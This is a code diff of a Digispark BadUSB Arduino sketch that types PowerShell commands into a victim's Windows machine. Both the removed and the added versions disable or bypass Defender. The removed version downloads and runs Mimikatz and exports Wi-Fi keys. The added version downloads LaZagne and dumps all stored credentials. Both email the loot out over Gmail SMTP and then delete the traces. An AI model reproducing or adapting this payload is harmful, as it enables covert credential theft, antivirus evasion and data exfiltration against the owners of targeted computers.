@@ -1,4 +1,5 @@
-#include "DigiKeyboard.h"
+
+#include "DigiKeyboardDe.h"
 
 void setup() {
   pinMode(1, OUTPUT); // on-board led for model A
@@ -17,47 +18,39 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  
-  DigiKeyboard.println("powershell -exec bypass -command \"mode con cols=18 lines=1\"");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("cd $env:temp");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println(F("Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz | Out-File -FilePath dmp_mimi;"));
-  DigiKeyboard.delay(30000); // Defender kills the process - opening a new window
 
-  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.println("powershell -exec bypass -command \"mode con cols=20 lines=1\""); // cols 20 or IWR won't work...
   DigiKeyboard.delay(2000);
-  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.println(F("$p = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; $q = $env:localappdata;"));
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.println("Add-MpPreference -ExclusionPath $p, $q");
   DigiKeyboard.delay(1000);
-  
-  DigiKeyboard.println("powershell -exec bypass -command \"mode con cols=18 lines=1\"");
+  DigiKeyboard.println("cd $q");
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("cd $env:temp");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("cmd /k netsh wlan export profile key=clear");
+  DigiKeyboard.println("IWR -uri 'https://raw.githubusercontent.com/hacknsec/digispark/main/Tools/lazagne.exe' -OutFile 'cred.exe';"); // Official binary is outdated - edit to use your own
+  DigiKeyboard.delay(30000); // Wait for download to finish
+  DigiKeyboard.println("./cred.exe all > cred.txt");
+  DigiKeyboard.delay(300000); // Cancel after 5 mins
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, KEY_C); 
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println(F("$SMTPServer = 'smtp.gmail.com'; $smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $smtp.EnableSsl = $true;"));
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.println(F("$smtp.Credentials = New-Object System.Net.NetworkCredential('<EMAIL>', '<PASSWORD>'); $hostname = hostname;"));
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.println(F("$attach = New-Object System.Net.Mail.Attachment(\"$env:localappdata\\cred.txt\"); $Mail = New-Object System.Net.Mail.MailMessage;"));
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.println(F("$Mail.From = '<EMAIL>'; $Mail.To.Add('<EMAIL>'); $Mail.Subject = \"Loot from \"+\"$hostname\";"));
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.println(F("$Mail.Body = \"Enjoy!\"; $Mail.Attachments.Add($attach); $smtp.Send($Mail);"));
+  DigiKeyboard.delay(15000);
+  DigiKeyboard.println("del cred*");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("Remove-MpPreference -ExclusionPath $p, $q");
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("exit");
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("Select-String -Path Wifi*.xml -Pattern 'keyMaterial' > dmp_wifi");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("Select-String -Path dmp_mimi -Pattern Username,NTLM,SHA1,Domain,Password > dmp_mimi2");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println(F("$SMTPServer = 'smtp.gmail.com'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<email>', '<password>'); $ReportEmail = New-Object System.Net.Mail.MailMessage"));
-  DigiKeyboard.delay(3000);
-  DigiKeyboard.println(F("$ReportEmail.From = '<email>'; $ReportEmail.To.Add('<email>'); $ReportEmail.Subject = 'new mimidump'; $ReportEmail.Body = Get-Content dmp_mimi2; $SMTPInfo.Send($ReportEmail);"));
-  DigiKeyboard.delay(3000);
-  DigiKeyboard.println(F("$ReportEmail.From = '<email>'; $ReportEmail.To.Add('<email>'); $ReportEmail.Subject = 'new wifidump'; $ReportEmail.Body = Get-Content dmp_wifi; $SMTPInfo.Send($ReportEmail); Remove-Item (Get-PSReadlineOption).HistorySavePath;"));
-  DigiKeyboard.delay(3000);
-  DigiKeyboard.println("del dmp*");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("exit");
   
   digitalWrite(1, HIGH); // LED indicator, ready to remove
-  DigiKeyboard.delay(20000);
+  DigiKeyboard.delay(900000);
   
 }
